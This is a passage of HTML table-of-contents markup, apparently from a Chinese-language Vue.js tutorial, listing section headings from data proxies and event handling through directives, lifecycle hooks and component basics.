href="#1-5-el%E4%B8%8Edata%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text">1.5.el与data的两种写法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-1-el%E7%9A%84-mount%E5%86%99%E6%B3%95"><span class="toc-number">2.5.1.</span> <span class="toc-text">1.5.1.el的$mount写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-2-data%E7%9A%84%E5%87%BD%E6%95%B0%E5%BC%8F%E5%86%99%E6%B3%95"><span class="toc-number">2.5.2.</span> <span class="toc-text">1.5.2.data的函数式写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-3-%E5%B0%8F%E7%BB%93%EF%BC%9Ael%E4%B8%8Edata%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-number">2.5.3.</span> <span class="toc-text">1.5.3.小结：el与data的两种写法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E7%90%86%E8%A7%A3MVVM"><span class="toc-number">2.6.</span> <span class="toc-text">1.6.理解MVVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-1-MVVM"><span class="toc-number">2.6.1.</span> <span class="toc-text">1.6.1.MVVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-2-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E8%A1%A5%E5%85%85"><span class="toc-number">2.6.2.</span> <span class="toc-text">1.6.2.模板语法补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-3-%E5%B0%8F%E7%BB%93%EF%BC%9AMVVM"><span class="toc-number">2.6.3.</span> <span class="toc-text">1.6.3.小结：MVVM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-7-%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-number">2.7.</span> <span class="toc-text">1.7.数据代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-1-Object-defineProperty"><span class="toc-number">2.7.1.</span> <span class="toc-text">1.7.1.Object.defineProperty</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E6%9E%9A%E4%B8%BE%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">2.7.1.1.</span> <span class="toc-text">可枚举配置项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">2.7.1.2.</span> <span class="toc-text">可修改配置项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E5%88%A0%E9%99%A4%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">2.7.1.3.</span> <span class="toc-text">可删除配置项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%9C%BA%E6%99%AF%E9%9C%80%E6%B1%82"><span class="toc-number">2.7.1.4.</span> <span class="toc-text">新场景需求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">2.7.1.5.</span> <span class="toc-text">get()配置项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set-%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">2.7.1.6.</span> <span class="toc-text">set()配置项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-number">2.7.1.7.</span> <span class="toc-text">理解数据代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Vue%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-number">2.7.1.8.</span> <span class="toc-text">Vue中的数据代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-2-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-number">2.7.2.</span> <span class="toc-text">1.7.2.小结：数据代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-3-%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.7.3.</span> <span class="toc-text">1.7.3.小问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-8-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-number">2.8.</span> <span class="toc-text">1.8.事件处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-1-methods%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">2.8.1.</span> <span class="toc-text">1.8.1.methods属性配置回调函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-2-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.8.2.</span> <span class="toc-text">1.8.2.回调函数的参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-3-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84this%E6%8C%87%E5%90%91"><span class="toc-number">2.8.3.</span> <span class="toc-text">1.8.3.回调函数中的this指向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#this%E6%8C%87%E5%90%91vm"><span class="toc-number">2.8.3.1.</span> <span class="toc-text">this指向vm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#this%E4%B8%8D%E6%8C%87%E5%90%91vm"><span class="toc-number">2.8.3.2.</span> <span class="toc-text">this不指向vm</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-4-v-on%E7%9A%84%E7%AE%80%E5%86%99"><span class="toc-number">2.8.4.</span> <span class="toc-text">1.8.4.v-on的简写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-5-%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%AD%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9A%84%E4%BC%A0%E5%8F%82"><span class="toc-number">2.8.5.</span> <span class="toc-text">1.8.5.点击事件中回调函数的传参</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.8.5.1.</span> <span class="toc-text">传递参数的基本语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#event%E5%AF%B9%E8%B1%A1%E4%B8%A2%E5%A4%B1%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="toc-number">2.8.5.2.</span> <span class="toc-text">event对象丢失的解决办法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-number">2.8.5.3.</span> <span class="toc-text">回调函数的几种写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E6%8C%82%E8%BD%BD%E5%9C%A8vm%E5%AE%9E%E4%BE%8B%E5%AF%B9%E8%B1%A1%E4%B8%8A"><span class="toc-number">2.8.5.4.</span> <span class="toc-text">回调函数挂载在vm实例对象上</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-6-%E5%B0%8F%E7%BB%93%EF%BC%9A%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-number">2.8.6.</span> <span class="toc-text">1.8.6.小结：事件处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-9-%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">2.9.</span> <span class="toc-text">1.9.事件修饰符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-1-prevent"><span class="toc-number">2.9.1.</span> <span class="toc-text">1.9.1.prevent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-2-stop"><span class="toc-number">2.9.2.</span> <span class="toc-text">1.9.2.stop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-3-once"><span class="toc-number">2.9.3.</span> <span class="toc-text">1.9.3.once</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-4-capture"><span class="toc-number">2.9.4.</span> <span class="toc-text">1.9.4.capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-5-self"><span class="toc-number">2.9.5.</span> <span class="toc-text">1.9.5.self</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-6-passive"><span class="toc-number">2.9.6.</span> <span class="toc-text">1.9.6.passive	</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-7-%E5%B0%8F%E7%BB%93%EF%BC%9A%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">2.9.7.</span> <span class="toc-text">1.9.7.小结：事件修饰符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-10-%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6"><span class="toc-number">2.10.</span> <span class="toc-text">1.10.键盘事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9A%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6"><span class="toc-number">2.10.1.</span> <span class="toc-text">小结：键盘事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-11-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.</span> <span class="toc-text">1.11.计算属性与监视属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-1-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.1.</span> <span class="toc-text">1.11.1.计算属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-1-1-%E5%B0%8F%E6%A1%88%E4%BE%8B"><span class="toc-number">2.11.1.1.</span> <span class="toc-text">1.11.1.1.小案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-2-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.1.2.</span> <span class="toc-text">1.11.2.2.计算属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-3-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E7%AE%80%E5%86%99%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.11.1.3.</span> <span class="toc-text">1.11.2.3.计算属性简写形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-4-%E5%B0%8F%E7%BB%93%EF%BC%9A%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.1.4.</span> <span class="toc-text">1.11.2.4.小结：计算属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-2-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.2.</span> <span class="toc-text">1.11.2.监视属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-1-%E5%B0%8F%E6%A1%88%E4%BE%8B"><span class="toc-number">2.11.2.1.</span> <span class="toc-text">1.11.2.1.小案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-2-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.2.2.</span> <span class="toc-text">1.11.2.2.监视属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-3-%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86"><span class="toc-number">2.11.2.3.</span> <span class="toc-text">1.11.2.3.深度监视</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86"><span class="toc-number">2.11.2.3.1.</span> <span class="toc-text">小结：深度监视</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-2-3-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7%E7%AE%80%E5%86%99%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.11.2.4.</span> <span class="toc-text">1.11.2.3.监视属性简写形式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-3-watch%E5%AF%B9%E6%AF%94computed"><span class="toc-number">2.11.3.</span> <span class="toc-text">1.11.3.watch对比computed</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-11-3-1-%E5%B0%8F%E7%BB%93%EF%BC%9Awatch%E5%AF%B9%E6%AF%94computed"><span class="toc-number">2.11.3.1.</span> <span class="toc-text">1.11.3.1.小结：watch对比computed</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-12-class%E4%B8%8Estyle%E7%BB%91%E5%AE%9A"><span class="toc-number">2.12.</span> <span class="toc-text">1.12.class与style绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-1-class%E7%BB%91%E5%AE%9A"><span class="toc-number">2.12.1.</span> <span class="toc-text">1.12.1.class绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-12-1-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E6%B3%95"><span class="toc-number">2.12.1.1.</span> <span class="toc-text">1.12.1.1.字符串写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-12-1-2-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95"><span class="toc-number">2.12.1.2.</span> <span class="toc-text">1.12.1.2.数组写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-12-1-3-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-number">2.12.1.3.</span> <span class="toc-text">1.12.1.3.对象写法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-2-style%E7%BB%91%E5%AE%9A"><span class="toc-number">2.12.2.</span> <span class="toc-text">1.12.2.style绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-3-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%A0%B7%E5%BC%8F%E7%BB%91%E5%AE%9A"><span class="toc-number">2.12.3.</span> <span class="toc-text">1.12.3.小结：样式绑定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-13-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93"><span class="toc-number">2.13.</span> <span class="toc-text">1.13.条件渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-1-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93%E6%8C%87%E4%BB%A4"><span class="toc-number">2.13.1.</span> <span class="toc-text">1.13.1.条件渲染指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-13-1-1-v-show"><span class="toc-number">2.13.1.1.</span> <span class="toc-text">1.13.1.1.v-show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-13-1-2-v-if"><span class="toc-number">2.13.1.2.</span> <span class="toc-text">1.13.1.2.v-if</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-13-1-3-%E5%8A%A8%E6%80%81%E6%8E%A7%E5%88%B6%E5%85%83%E7%B4%A0%E7%9A%84%E6%98%BE%E7%A4%BA%E5%92%8C%E9%9A%90%E8%97%8F"><span class="toc-number">2.13.1.3.</span> <span class="toc-text">1.13.1.3.动态控制元素的显示和隐藏</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-2-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93"><span class="toc-number">2.13.2.</span> <span class="toc-text">1.13.2.小结：条件渲染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-14-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93"><span class="toc-number">2.14.</span> <span class="toc-text">1.14.列表渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-1-v-for%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.14.1.</span> <span class="toc-text">1.14.1.v-for基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-2-key%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">2.14.2.</span> <span class="toc-text">1.14.2.key的作用与原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-3-%E5%B0%8F%E7%BB%93%EF%BC%9A%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93"><span class="toc-number">2.14.3.</span> <span class="toc-text">1.14.3.小结：列表渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-4-%E5%88%97%E8%A1%A8%E8%BF%87%E6%BB%A4"><span class="toc-number">2.14.4.</span> <span class="toc-text">1.14.4.列表过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-5-%E5%88%97%E8%A1%A8%E6%8E%92%E5%BA%8F"><span class="toc-number">2.14.5.</span> <span class="toc-text">1.14.5.列表排序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-15-vue%E7%9B%91%E6%B5%8B%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.15.</span> <span class="toc-text">1.15.vue监测数据改变的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-1-%E6%95%B0%E6%8D%AE%E6%9B%B4%E6%96%B0%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">2.15.1.</span> <span class="toc-text">1.15.1.数据更新时的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-2-Vue%E7%9B%91%E6%B5%8B%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.15.2.</span> <span class="toc-text">1.15.2.Vue监测对象数据改变的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-3-Vue-set-%E6%96%B9%E6%B3%95"><span class="toc-number">2.15.3.</span> <span class="toc-text">1.15.3.Vue.set()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-4-Vue%E6%A3%80%E6%B5%8B%E6%95%B0%E7%BB%84%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.15.4.</span> <span class="toc-text">1.15.4.Vue检测数组数据改变的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-5-%E5%B0%8F%E7%BB%93%EF%BC%9AVue%E7%9B%91%E8%A7%86%E6%95%B0%E6%8D%AE"><span class="toc-number">2.15.5.</span> <span class="toc-text">1.15.5.小结：Vue监视数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-16-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE"><span class="toc-number">2.16.</span> <span class="toc-text">1.16.收集表单数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-16-1-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BE%93%E5%85%A5%E6%A1%86"><span class="toc-number">2.16.1.</span> <span class="toc-text">1.16.1.不同类型的输入框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-16-2-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE"><span class="toc-number">2.16.2.</span> <span class="toc-text">1.16.2.小结：收集表单数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-17-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.17.</span> <span class="toc-text">1.17.过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-1-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.17.1.</span> <span class="toc-text">1.17.1.过滤器的基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-2-%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BC%A0%E5%8F%82"><span class="toc-number">2.17.2.</span> <span class="toc-text">1.17.2.过滤器传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-3-%E8%BF%87%E6%BB%A4%E5%99%A8%E4%B8%B2%E8%81%94"><span class="toc-number">2.17.3.</span> <span class="toc-text">1.17.3.过滤器串联</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-4-%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.17.4.</span> <span class="toc-text">1.17.4.全局过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-8-%E5%B0%8F%E7%BB%93%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.17.5.</span> <span class="toc-text">1.17.8.小结：过滤器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-18-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4"><span class="toc-number">2.18.</span> <span class="toc-text">1.18.内置指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-1-%E5%AD%A6%E8%BF%87%E7%9A%84%E6%8C%87%E4%BB%A4"><span class="toc-number">2.18.1.</span> <span class="toc-text">1.18.1.学过的指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-2-v-text"><span class="toc-number">2.18.2.</span> <span class="toc-text">1.18.2.v-text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-3-v-html"><span class="toc-number">2.18.3.</span> <span class="toc-text">1.18.3.v-html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-4-v-cloak"><span class="toc-number">2.18.4.</span> <span class="toc-text">1.18.4.v-cloak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-5-v-once"><span class="toc-number">2.18.5.</span> <span class="toc-text">1.18.5.v-once</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-6-v-pre"><span class="toc-number">2.18.6.</span> <span class="toc-text">1.18.6.v-pre</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-19-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4"><span class="toc-number">2.19.</span> <span class="toc-text">1.19.自定义指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-1-%E5%87%BD%E6%95%B0%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.19.1.</span> <span class="toc-text">1.19.1.函数形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-2-%E5%AF%B9%E8%B1%A1%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.19.2.</span> <span class="toc-text">1.19.2.对象形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-3-%E5%B0%8F%E7%BB%93%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E5%AE%9A"><span class="toc-number">2.19.3.</span> <span class="toc-text">1.19.3.小结：自定义指定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-20-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">2.20.</span> <span class="toc-text">1.20.生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-1-%E5%BC%95%E5%87%BA%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">2.20.1.</span> <span class="toc-text">1.20.1.引出生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-2-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%8C%82%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">2.20.2.</span> <span class="toc-text">1.20.2.生命周期挂载流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-3-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">2.20.3.</span> <span class="toc-text">1.20.3.生命周期更新流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-4-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%94%80%E6%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.20.4.</span> <span class="toc-text">1.20.4.生命周期销毁流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-5-%E5%B0%8F%E7%BB%93%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">2.20.5.</span> <span class="toc-text">1.20.5.小结：生命周期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E7%BC%96%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">2.Vue组件化编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%A8%A1%E5%9D%97%E4%B8%8E%E7%BB%84%E4%BB%B6%E3%80%81%E6%A8%A1%E5%9D%97%E5%8C%96%E4%B8%8E%E7%BB%84%E4%BB%B6%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">2.1.模块与组件、模块化与组件化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.1.1.</span> <span class="toc-text">2.1.1.模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E7%BB%84%E4%BB%B6"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.1.2.组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E6%A8%A1%E5%9D%97%E5%8C%96"><span class="toc-number">3.1.3.</span> <span class="toc-text">2.1.3.模块化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-%E7%BB%84%E4%BB%B6%E5%8C%96"><span class="toc-number">3.1.4.</span> <span class="toc-text">2.1.4.组件化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E9%9D%9E%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text">2.2.非单文件组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%B1%80%E9%83%A8%E7%BB%84%E4%BB%B6"><span class="toc-number">3.2.1.</span> <span class="toc-text">2.2.1.局部组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E5%85%A8%E5%B1%80%E7%BB%84%E4%BB%B6"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.2.2.全局组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-%E5%B0%8F%E7%BB%93%EF%BC%9A%E9%9D%9E%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-number">3.2.3.</span> <span class="toc-text">2.2.3.小结：非单文件组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6%E7%9A%84%E5%87%A0%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">3.2.4.</span> <span class="toc-text">2.2.4.使用组件的几个注意点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-5-%E7%BB%84%E4%BB%B6%E7%9A%84%E5%B5%8C%E5%A5%97"><span class="toc-number">3.2.5.</span> <span class="toc-text">2.2.5.组件的嵌套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-6-VueComponent%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.6.</span> <span class="toc-text">2.2.6.VueComponent构造函数</span></a></li><li class="toc-item toc-level-3"><a 